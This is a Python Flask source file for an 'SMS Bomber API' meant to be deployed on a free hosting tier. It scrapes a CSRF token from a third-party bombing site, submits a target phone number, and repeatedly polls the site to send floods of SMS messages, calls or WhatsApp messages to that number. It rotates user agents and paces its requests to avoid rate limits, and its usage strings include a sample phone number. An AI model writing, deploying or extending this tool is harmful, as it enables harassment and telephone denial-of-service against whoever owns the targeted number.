#!/usr/bin/env python3
"""
Upgraded SMS Bomber API - Deployable on Render.com Free (Web Service)
- Browser param-based: /bomb?number=9711558310&country=91&type=sms&polls=10
- Limited concurrency (max 3), queue + wait
- Auto cleanup completed tasks
- Robust error handling + fallback if CSRF/token changes
"""

import sys
import os
import time
import re
import json
import base64
import random
import threading
import logging
from queue import Queue
from typing import Dict, Optional
from flask import Flask, request, jsonify
import requests

logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger(__name__)

BASE_URL = "https://toolground.in"
BOMBER_URL = f"{BASE_URL}/sms-bomber.php"
POLL_INTERVAL = 4  # increased to avoid rate-limit
MAX_POLLS = 30
MAX_CONCURRENT = 3  # safe for free tier
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
]

task_queue = Queue()
active_tasks: Dict[str, threading.Thread] = {}
task_lock = threading.Lock()
task_counter = 0

class SMSBomber:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })

    def _get_csrf_token(self) -> Optional[str]:
        try:
            resp = self.session.get(BOMBER_URL, timeout=12)
            resp.raise_for_status()
            match = re.search(r'name="_token"\s+value="([^"]+)"', resp.text)
            if match:
                return match.group(1)
            log.warning("No CSRF token found - page may have changed")
            return None
        except Exception as e:
            log.error("CSRF fetch failed: %s", e)
            return None

    def _submit_form(self, phone: str, country: str, bomb_type: str, csrf_token: Optional[str]) -> Optional[str]:
        data = {
            "country": country,
            "number": phone,
            "terms": "on",
            "submit": bomb_type,
        }
        if csrf_token:
            data["_token"] = csrf_token

        try:
            resp = self.session.post(
                BOMBER_URL,
                data=data,
                headers={
                    "Referer": BOMBER_URL,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": BASE_URL,
                },
                timeout=12,
                allow_redirects=True
            )
            resp.raise_for_status()

            # Try extract base64 data
            match = re.search(r'bombing\.php\?data=([A-Za-z0-9+/=]+)', resp.text)
            if match:
                b64 = match.group(1) + "==" * (4 - len(match.group(1)) % 4)
                try:
                    data = json.loads(base64.b64decode(b64))
                    return data.get("token")
                except:
                    pass

            # Fallback: look for token in any JSON-like
            try:
                j = resp.json()
                return j.get("token") or j.get("bomb_token")
            except:
                pass

            log.warning("No bomb token found in response")
            return None
        except Exception as e:
            log.error("Form submit failed: %s", e)
            return None

    def _poll_api(self, bomb_token: str, country: str, bomb_type: str) -> Dict:
        api_url = f"{BASE_URL}/api/{bomb_type}.php?token={bomb_token}&code={country}"
        try:
            resp = self.session.get(
                api_url,
                headers={
                    "Referer": f"{BASE_URL}/bombing.php",
                    "X-Requested-With": "XMLHttpRequest",
                    "Accept": "application/json",
                },
                timeout=10,
            )
            if resp.status_code == 200:
                try:
                    return resp.json()
                except:
                    return {"raw": resp.text[:300]}
            return {"error": resp.status_code, "text": resp.text[:200]}
        except Exception as e:
            return {"error": str(e)}

    def run_bomb(self, phone: str, country: str = "91", bomb_type: str = "sms", polls: int = 10) -> Dict:
        task_id = f"{task_counter}-{phone}-{bomb_type}"
        stats = {
            "task_id": task_id,
            "phone": f"+{country}{phone}",
            "type": bomb_type,
            "polls_done": 0,
            "messages_sent": 0,
            "errors": [],
            "status": "running",
        }

        bomber = SMSBomber()
        csrf = bomber._get_csrf_token()
        token = bomber._submit_form(phone, country, bomb_type, csrf)

        if not token:
            stats["status"] = "failed"
            stats["errors"].append("Failed to get bomb token - site may be down or changed")
            return stats

        log.info("Bomb started | Task %s | %d polls", task_id, polls)

        for i in range(1, min(polls, MAX_POLLS) + 1):
            result = bomber._poll_api(token, country, bomb_type)
            stats["polls_done"] += 1

            if "count" in result:
                stats["messages_sent"] = result["count"]
            elif "smsCount" in result:
                stats["messages_sent"] = result.get("smsCount", 0) + result.get("callCount", 0) + result.get("whatsappCount", 0)

            if "error" in result:
                stats["errors"].append(result)
                if result.get("error") in (401, 403):
                    break

            time.sleep(POLL_INTERVAL + random.uniform(0, 2))

        stats["status"] = "completed" if not stats["errors"] else "partial"
        log.info("Bomb completed | Task %s | Messages ~%d", task_id, stats["messages_sent"])
        return stats

def worker():
    global task_counter
    while True:
        task = task_queue.get()
        if task is None:
            break
        with task_lock:
            task_counter += 1
            active_tasks[task["id"]] = threading.current_thread()

        try:
            result = SMSBomber().run_bomb(**task["params"])
            log.info("Task %s result: %s", task["id"], result["status"])
        finally:
            with task_lock:
                active_tasks.pop(task["id"], None)
            task_queue.task_done()

# Start worker threads (limited)
for _ in range(MAX_CONCURRENT):
    t = threading.Thread(target=worker, daemon=True)
    t.start()

# Flask app
app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    with task_lock:
        status = {
            "service": "SMS Bomber API (Render Free)",
            "active_tasks": len(active_tasks),
            "queued": task_queue.qsize(),
            "max_concurrent": MAX_CONCURRENT,
            "usage": "GET/POST /bomb?number=9711558310&country=91&type=sms&polls=5"
        }
    return jsonify(status)

@app.route("/bomb", methods=["GET", "POST"])
def bomb():
    if request.method == "POST":
        data = request.get_json(silent=True) or {}
    else:
        data = request.args.to_dict()

    number = data.get("number", "").strip()
    country = data.get("country", "91").strip()
    btype = data.get("type", "sms").lower().strip()
    polls = min(int(data.get("polls", 10)), MAX_POLLS)

    if not number or not number.isdigit():
        return jsonify({"error": "Valid 'number' (digits only) required"}), 400

    if btype not in ("sms", "call", "whatsapp", "mix"):
        return jsonify({"error": "Invalid type. Use: sms, call, whatsapp, mix"}), 400

    task_id = f"task-{random.randint(10000,99999)}"
    task = {
        "id": task_id,
        "params": {"phone": number, "country": country, "bomb_type": btype, "polls": polls}
    }

    if len(active_tasks) >= MAX_CONCURRENT:
        task_queue.put(task)
        return jsonify({
            "status": "queued",
            "task_id": task_id,
            "position": task_queue.qsize(),
            "message": f"Queued (max {MAX_CONCURRENT} concurrent)"
        }), 202

    task_queue.put(task)
    return jsonify({
        "status": "started",
        "task_id": task_id,
        "message": "Bomb task accepted"
    }), 200

@app.route("/status/<task_id>", methods=["GET"])
def get_status(task_id):
    # Simple - only active/queued shown; completed not persisted (free tier no disk/db)
    with task_lock:
        if task_id in active_tasks:
            return jsonify({"status": "running"})
    return jsonify({"status": "unknown or completed"})

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "active": len(active_tasks), "queued": task_queue.qsize()})

if __name__ == "__main__":
    if os.environ.get("START_SERVER") == "1":
        port = int(os.environ.get("PORT", 5000))
        log.info("Starting Render API on port %d", port)
        app.run(host="0.0.0.0", port=port, debug=False)
    else:
        print(__doc__)
        if len(sys.argv) > 1:
            # CLI fallback if needed
            number = sys.argv[1]
            country = sys.argv[2] if len(sys.argv) > 2 else "91"
            btype = sys.argv[3] if len(sys.argv) > 3 else "sms"
            polls = int(sys.argv[4]) if len(sys.argv) > 4 else 10
            SMSBomber().run_bomb(number, country, btype, polls)
